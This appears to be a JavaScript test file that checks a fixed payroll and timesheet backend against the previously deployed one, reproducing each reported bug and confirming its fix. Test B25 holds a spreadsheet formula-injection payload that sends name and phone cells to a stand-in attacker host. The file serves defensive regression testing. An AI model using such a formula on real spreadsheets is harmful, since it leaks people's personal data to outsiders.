// The 35 backend checks from the October 2026 health check, re-run against
// BOTH backends:
//   deployed = the Code.gs live before PR #2 (tests/fixtures/Code.deployed.gs)
//   new      = deliverables/Code.gs
// For the bugs the report found, the "deployed" run asserts the bug is still
// reproducible there and the "new" run asserts it is fixed. Checks that passed
// in the report must pass on both.
"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const { loadBackend } = require("../harness/gas");
const H = require("../harness/helpers");

const PUBLIC_OK = ["doGet", "doPost", "onOpen", "showPendingDashboard", "approveSelected", "rejectSelected",
  "refreshPayroll", "markApprovedAsPaid", "runPayrollForMonths", "runMarkPaidForMonths"].sort();
const STUBS = new Set(["console", "JSON", "Math", "Date", "Object", "Array", "String", "Number", "RegExp", "Error",
  "parseInt", "parseFloat", "isNaN", "encodeURIComponent", "decodeURIComponent"]);

function publicFunctions(be) {
  return Object.keys(be.ctx).filter((k) => typeof be.ctx[k] === "function" && !STUBS.has(k) && !k.endsWith("_")).sort();
}

function syncSetup(be, crewOpts) {
  const hp = be.notion.addHiring({ title: "Sep Roadshow Helper", projectNo: "P100", role: "Event Helper", client: "Test Mall" });
  const crewId = crewOpts ? be.notion.addCrew(Object.assign({ name: "Chan Tai Man", phone: "91234567" }, crewOpts)) : null;
  const r = H.addRow(be, { status: "Approved", projectNo: "P100", role: "Event Helper" });
  return { hp, crewId, r };
}
function relationWrites(be, crewId) {
  return be.notion.calls.filter((c) => c.method === "patch" && c.path.endsWith(crewId) && c.body.properties["Jobs Assigned 派工記錄"]);
}

for (const variant of ["deployed", "new"]) {
  const isNew = variant === "new";
  const t = (id, title, fn) => test(`${id} [${variant}] ${title}`, () => fn(loadBackend(variant)));

  t("B01", "submit writes one row with columns A–P in contract order", (be) => {
    const res = H.submit(be, [H.entry({ notes: "hello" })]);
    assert.equal(res.status, "success");
    assert.equal(res.rowsAdded, 1);
    const r = H.rowObj(be, 2);
    assert.equal(r.name, "Chan Tai Man");
    assert.equal(String(r.phone), "91234567");
    assert.equal(r.date, "2026-09-10");
    assert.equal(r.venue, "Test Mall");
    assert.equal(r.rate, 800);
    assert.equal(r.notes, "hello");
    assert.equal(r.pic, "Michael");
    assert.equal(r.projectNo, "");
    assert.equal(r.role, "");
    assert.equal(r.synced, "");
  });

  t("B02", "submit writes Pending in N and the Final Rate formula in M", (be) => {
    H.submit(be, [H.entry()]);
    assert.equal(H.rowObj(be, 2).status, "Pending");
    assert.equal(be.tab().peek(2, 13).f, '=IF(L2="", F2, F2+L2)');
    assert.equal(H.rowObj(be, 2).m, 800);
  });

  t("B03", "phone is stored digits-only", (be) => {
    H.submit(be, [H.entry({ phoneNumber: "9123 4567" })]);
    assert.equal(String(H.rowObj(be, 2).phone), "91234567");
  });

  t("B04", "status finds rows by canonical phone and shows HH:mm times without the +7:36 shift", (be) => {
    H.submit(be, [H.entry()]);
    const res = H.status(be, "9123-4567");
    assert.equal(res.status, "success");
    assert.equal(res.submissions.length, 1);
    assert.equal(res.submissions[0].startTime, "10:00");
    assert.equal(res.submissions[0].endTime, "18:00");
    assert.equal(res.submissions[0].status, "Pending");
  });

  t("B05", "status lists most recent work date first", (be) => {
    H.submit(be, [H.entry({ dateOfWork: "2026-09-01" }), H.entry({ dateOfWork: "2026-09-20" }), H.entry({ dateOfWork: "2026-09-05" })]);
    assert.deepEqual(H.status(be, "91234567").submissions.map((s) => s.dateOfWork), ["2026-09-20", "2026-09-05", "2026-09-01"]);
  });

  t("B06", "same phone + date as an earlier row is flagged as a possible duplicate", (be) => {
    H.submit(be, [H.entry()]);
    const res = H.submit(be, [H.entry()]);
    assert.deepEqual(res.duplicates, [1]);
    assert.match(H.rowObj(be, 3).notes, /Possible duplicate/);
  });

  t("B07", "duplicates inside one submission are flagged", (be) => {
    const res = H.submit(be, [H.entry(), H.entry({ startTime: "19:00", endTime: "22:00" })]);
    assert.deepEqual(res.duplicates, [2]);
  });

  t("B08", "wrong access code is rejected on submit and nothing is written", (be) => {
    const res = H.submit(be, [H.entry()], { accessCode: "wrong" });
    assert.equal(res.status, "error");
    assert.match(res.message, /access code/i);
    assert.equal(be.tab().getLastRow(), 1);
  });

  t("B09", "wrong access code is rejected on status", (be) => {
    H.submit(be, [H.entry()]);
    const res = H.status(be, "91234567", "wrong");
    assert.equal(res.status, "error");
    assert.equal(res.submissions, undefined);
  });

  t("B10", "server rejects an invalid entry (+852 phone) and writes nothing", (be) => {
    const res = H.submit(be, [H.entry({ phoneNumber: "+852 91234567" })]);
    assert.equal(res.status, "error");
    assert.equal(be.tab().getLastRow(), 1);
  });

  t("B11", "A1: /exec health check is " + (isNew ? "plain text (fixed)" : "an HtmlService page (bug reproduced)"), (be) => {
    const out = be.ctx.doGet({});
    assert.equal(out.kind, isNew ? "text" : "html");
  });

  t("B12", "A1: internal handlers " + (isNew ? "are private (fixed)" : "are public and skip the access code (bug reproduced)"), (be) => {
    if (isNew) {
      assert.deepEqual(publicFunctions(be), PUBLIC_OK);
      assert.equal(be.ctx.handleSubmit, undefined);
      assert.equal(be.ctx.handleStatus, undefined);
    } else {
      be.ctx.handleSubmit({ entries: [H.entry()] });   // no access code at all
      assert.equal(be.tab().getLastRow(), 2);
      assert.equal(be.ctx.handleStatus({ phoneNumber: "91234567" }).submissions.length, 1);
    }
  });

  t("B13", "A1: notionApiCall " + (isNew ? "is not callable from a page (fixed)" : "sends the owner's key to any endpoint (bug reproduced)"), (be) => {
    if (isNew) {
      assert.equal(be.ctx.notionApiCall, undefined);
    } else {
      be.ctx.notionApiCall("search", "post", {});
      assert.equal(be.notion.calls[0].auth, "Bearer secret_test_key");
    }
  });

  test(`B14 [${variant}] lock timeout returns an error before anything is written`, () => {
    const be = loadBackend(variant, { lockTimeout: true });
    const res = H.submit(be, [H.entry()]);
    assert.equal(res.status, "error");
    assert.equal(be.tab().getLastRow(), 1);
  });

  test(`B15 [${variant}] D2: a write failure after job 1 of 3 ` + (isNew ? "reports which jobs are saved (fixed)" : "returns a bare error (bug reproduced)"), () => {
    const be = loadBackend(variant, { failAppendAt: 2 });
    const res = H.submit(be, [H.entry({ dateOfWork: "2026-09-01" }), H.entry({ dateOfWork: "2026-09-02" }), H.entry({ dateOfWork: "2026-09-03" })]);
    assert.equal(res.status, "error");
    assert.equal(be.tab().getLastRow(), 2);   // job 1 is saved
    if (isNew) {
      assert.deepEqual(res.savedEntries, [1]);
      assert.equal(be.mail.length, 1);
    } else {
      assert.equal(res.savedEntries, undefined);
      assert.equal(be.mail.length, 0);
    }
  });

  t("B16", "P5: Final Rate #VALUE! " + (isNew ? "is flagged CHECK, never paid as $0 (fixed)" : "is silently paid as $0 (bug reproduced)"), (be) => {
    const r = H.addRow(be, { status: "Approved", ot: "200 (2h OT)" });
    assert.equal(H.rowObj(be, r).m, "#VALUE!");
    H.runPayroll(be, ["2026-09"]);
    const fps = H.fpsList(be);
    assert.equal(fps[0].amount, 0);
    if (isNew) {
      assert.match(fps[0].status, /CHECK row 2/);
      assert.ok(be.ui.alerts.some((a) => /no valid Final Rate/.test(a) && /2/.test(a)));
    } else {
      assert.doesNotMatch(fps[0].status, /CHECK/);
      assert.ok(!be.ui.alerts.some((a) => /Final Rate/.test(a)));
    }
  });

  t("B17", "P5: blank Final Rate " + (isNew ? "falls back to F + L (fixed)" : "is paid as $0 (bug reproduced)"), (be) => {
    H.addRow(be, { status: "Approved", ot: 100, m: "blank" });
    H.runPayroll(be, ["2026-09"]);
    assert.equal(H.fpsList(be)[0].amount, isNew ? 900 : 0);
  });

  function partialSetup(be) {
    H.addRow(be, { status: "Paid", dateOfWork: "2026-09-05", basicRate: 800 });
    H.addRow(be, { status: "Approved", dateOfWork: "2026-09-25", basicRate: 900, venue: "Late Mall" });
  }

  t("B18", "P1: a PARTIAL person's FPS amount " + (isNew ? "is what is still owed (fixed)" : "is paid + unpaid (bug reproduced)"), (be) => {
    partialSetup(be);
    H.runPayroll(be, ["2026-09"]);
    const fps = H.fpsList(be);
    assert.equal(fps.length, 1);
    assert.match(fps[0].status, /PARTIAL/);
    assert.equal(fps[0].amount, isNew ? 900 : 1700);
  });

  t("B19", "P1: following the banner then Mark as Paid " + (isNew ? "pays exactly what is marked (fixed)" : "marks an unpaid job Paid (bug reproduced)"), (be) => {
    partialSetup(be);
    H.runPayroll(be, ["2026-09"]);
    const fps = H.fpsList(be);
    // Accounting follows the banner: deployed says "pay TO PAY rows only" → PARTIAL row skipped (paid 0);
    // new says "pay the TO PAY amount" → pays column D.
    const paidByAccounting = isNew ? fps[0].amount : 0;
    H.markPaid(be, ["2026-09"]);
    const late = H.rows(be).find((x) => x.venue === "Late Mall");
    assert.equal(late.status, "Paid");
    if (isNew) assert.equal(paidByAccounting, 900);           // what was paid == the job that flipped
    else assert.equal(paidByAccounting, 0);                   // flipped to Paid, yet nobody paid it
  });

  t("B20", "P2: a job approved after Refresh Payroll " + (isNew ? "stays Approved on Mark as Paid (fixed)" : "is marked Paid unpaid (bug reproduced)"), (be) => {
    H.addRow(be, { status: "Approved", basicRate: 800 });
    H.runPayroll(be, ["2026-09"]);
    assert.equal(H.fpsList(be)[0].amount, 800);
    H.addRow(be, { status: "Approved", basicRate: 1000, venue: "Late Mall", dateOfWork: "2026-09-26" });
    H.markPaid(be, ["2026-09"]);
    const late = H.rows(be).find((x) => x.venue === "Late Mall");
    assert.equal(late.status, isNew ? "Approved" : "Paid");
    if (isNew) assert.ok(be.ui.alerts.some((a) => /NOT on the payment list/.test(a)));
  });

  t("B21", "running Mark as Paid twice is safe", (be) => {
    H.addRow(be, { status: "Approved" });
    H.runPayroll(be, ["2026-09"]);
    H.markPaid(be, ["2026-09"]);
    const before = JSON.stringify(H.rows(be));
    H.markPaid(be, ["2026-09"]);
    assert.equal(JSON.stringify(H.rows(be)), before);
  });

  t("B22", "P3: approving after a sort " + (isNew ? "skips the moved row (fixed)" : "flips a Paid job back to Approved (bug reproduced)"), (be) => {
    H.addRow(be, { status: "Pending", dateOfWork: "2026-09-15", venue: "Sep Mall" });
    H.addRow(be, { status: "Paid", dateOfWork: "2026-08-15", venue: "Aug Mall" });
    be.call("showPendingDashboard");
    be.tab().sortDataRows(4);                       // PM sorts by date: Aug row moves to row 2
    const dash = be.sheet("Dashboard");
    dash.write(2, 1, true);
    dash.getRange(2, 9).setValue("P200");
    dash.write(2, 11, "Promoter");
    be.call("approveSelected");
    const aug = H.rows(be).find((x) => x.venue === "Aug Mall");
    const sep = H.rows(be).find((x) => x.venue === "Sep Mall");
    if (isNew) {
      assert.equal(aug.status, "Paid");
      assert.equal(sep.status, "Pending");
      assert.ok(be.ui.alerts.some((a) => /SKIPPED/.test(a)));
    } else {
      assert.equal(aug.status, "Approved");
      assert.equal(sep.status, "Pending");
    }
  });

  t("B23", "P4: the Dashboard " + (isNew ? "shows Notes with the duplicate flag (fixed)" : "has no Notes column (bug reproduced)"), (be) => {
    H.submit(be, [H.entry({ notes: "2h OT" })]);
    H.submit(be, [H.entry()]);
    be.call("showPendingDashboard");
    const v = be.sheet("Dashboard").values();
    const header = v[0].join("|");
    if (isNew) {
      assert.match(header, /Notes 備註/);
      assert.equal(v[1][11], "2h OT");
      assert.match(v[2][11], /Possible duplicate/);
    } else {
      assert.doesNotMatch(header, /Notes/);
      assert.ok(!v.flat().some((x) => /duplicate/i.test(String(x))));
    }
  });

  t("B24", "P4: duplicate rows " + (isNew ? "are shaded red on the Dashboard (fixed)" : "look like any other row (bug reproduced)"), (be) => {
    H.submit(be, [H.entry()]);
    H.submit(be, [H.entry()]);
    be.call("showPendingDashboard");
    const bg = be.sheet("Dashboard").peek(3, 3).bg;
    if (isNew) assert.equal(bg, "#FDDEDE");
    else assert.notEqual(bg, "#FDDEDE");
  });

  t("B25", "I1: a note starting with = " + (isNew ? "is stored as plain text (fixed)" : "is stored as a live formula (bug reproduced)"), (be) => {
    const evil = '=IMPORTXML("https://attacker.example/?"&B2&C2, "//a")';
    H.submit(be, [H.entry({ notes: evil })]);
    const cell = be.tab().peek(2, 9);
    if (isNew) {
      assert.equal(cell.f, null);
      assert.equal(cell.v, evil);
      assert.deepEqual(be.tab().formulas().map((f) => f.c), [13]);   // only the column M formula
    } else {
      assert.equal(cell.f, evil);
    }
  });

  t("B26", "the PM email is plain text (no HTML body)", (be) => {
    H.submit(be, [H.entry({ workVenue: "<b>Mall</b>" })]);
    assert.equal(be.mail.length, 1);
    assert.equal(be.mail[0].length, 3);
    assert.match(be.mail[0][2], /<b>Mall<\/b>/);
  });

  t("B27", "month filter: a 31 Aug job is not in the Sep payroll", (be) => {
    H.addRow(be, { status: "Approved", dateOfWork: "2026-08-31" });
    H.addRow(be, { status: "Approved", dateOfWork: "2026-09-01", basicRate: 700 });
    H.runPayroll(be, ["2026-09"]);
    const fps = H.fpsList(be);
    assert.equal(fps[0].jobs, 1);
    assert.equal(fps[0].amount, 700);
  });

  t("B28", "Job_Summary grand total matches a hand count (basic + OT, all months)", (be) => {
    H.addRow(be, { status: "Approved", dateOfWork: "2026-08-20", basicRate: 600, ot: 150, projectNo: "P1" });
    H.addRow(be, { status: "Paid", dateOfWork: "2026-09-02", basicRate: 800, projectNo: "P2" });
    H.addRow(be, { status: "Approved", dateOfWork: "2026-09-03", basicRate: 500, staffName: "Wong", phoneNumber: "61234567", projectNo: "P2" });
    H.addRow(be, { status: "Pending", dateOfWork: "2026-09-04", basicRate: 999 });
    H.runPayroll(be, ["2026-09"]);
    const v = be.sheet("Job_Summary").values();
    const g = v.find((row) => /GRAND TOTAL/.test(String(row[0])));
    assert.equal(g[4], 600 + 150 + 800 + 500);
  });

  t("B29", "N1: a crew with 30 job links " + (isNew ? "keeps all 30 + the new one (fixed)" : "loses links beyond 25 (bug reproduced)"), (be) => {
    const old = Array.from({ length: 30 }, (_, i) => "old-" + i);
    const { crewId } = syncSetup(be, { relations: old });
    be.call("syncMonthlyToNotion", ["2026-09"]);
    const w = relationWrites(be, crewId);
    assert.equal(w.length, 1);
    assert.equal(w[0].body.properties["Jobs Assigned 派工記錄"].relation.length, isNew ? 31 : 26);
    assert.equal(be.notion.relations(crewId).length, isNew ? 31 : 26);
  });

  t("B30", "N2: a Work Log split in two parts " + (isNew ? "is kept whole (fixed)" : "loses its second part (bug reproduced)"), (be) => {
    const { crewId } = syncSetup(be, { workLogParts: ["2026-07 │ A │ P1 │ $800/day\n", "2026-08 │ B │ P2 │ $800/day"] });
    be.call("syncMonthlyToNotion", ["2026-09"]);
    const log = be.notion.workLog(crewId);
    assert.match(log, /2026-07/);
    assert.match(log, /2026-09/);
    if (isNew) assert.match(log, /2026-08/);
    else assert.doesNotMatch(log, /2026-08/);
  });

  t("B31", "N2: a Work Log near 2000 characters " + (isNew ? "is written in parts and the row is stamped (fixed)" : "fails with a 2000 error every sync (bug reproduced)"), (be) => {
    const { crewId, r } = syncSetup(be, { workLogParts: ["x".repeat(1990)] });
    be.call("syncMonthlyToNotion", ["2026-09"]);
    const logV = be.sheet("Sync_Log").values().map((row) => row.join(" ")).join("\n");
    if (isNew) {
      assert.notEqual(H.rowObj(be, r).synced, "");
      assert.ok(be.notion.workLogParts(crewId).every((p) => p.length <= 2000));
      assert.match(be.notion.workLog(crewId), /2026-09/);
    } else {
      assert.equal(H.rowObj(be, r).synced, "");
      assert.match(logV, /ERROR.*2000/);
    }
  });

  t("B32", "a successful sync stamps column P", (be) => {
    const { r, crewId, hp } = syncSetup(be, {});
    be.call("syncMonthlyToNotion", ["2026-09"]);
    assert.match(String(H.rowObj(be, r).synced), /\(HKT\)$/);
    assert.deepEqual(be.notion.relations(crewId), [hp]);
  });

  t("B33", "a legacy spaced phone and a digits-only phone merge into one FPS line", (be) => {
    H.addRow(be, { status: "Approved", phoneNumber: "9123 4567", dateOfWork: "2026-09-01" });
    H.addRow(be, { status: "Approved", phoneNumber: "91234567", dateOfWork: "2026-09-02" });
    H.runPayroll(be, ["2026-09"]);
    const fps = H.fpsList(be);
    assert.equal(fps.length, 1);
    assert.equal(fps[0].jobs, 2);
    assert.equal(fps[0].amount, 1600);
  });

  t("B34", "status finds both legacy-spaced and digits-only rows", (be) => {
    H.addRow(be, { phoneNumber: "9123 4567", dateOfWork: "2026-09-01" });
    H.addRow(be, { phoneNumber: "91234567", dateOfWork: "2026-09-02" });
    assert.equal(H.status(be, "91234567").submissions.length, 2);
  });

  t("B35", "Mark as Paid only touches Approved rows in the chosen months", (be) => {
    H.addRow(be, { status: "Approved", dateOfWork: "2026-08-20", venue: "Aug Mall" });
    H.addRow(be, { status: "Approved", dateOfWork: "2026-09-20", venue: "Sep Mall" });
    H.addRow(be, { status: "Pending", dateOfWork: "2026-09-21", venue: "Pending Mall" });
    H.runPayroll(be, ["2026-09"]);
    H.markPaid(be, ["2026-09"]);
    const by = Object.fromEntries(H.rows(be).map((x) => [x.venue, x.status]));
    assert.deepEqual(by, { "Aug Mall": "Approved", "Sep Mall": "Paid", "Pending Mall": "Pending" });
  });
}
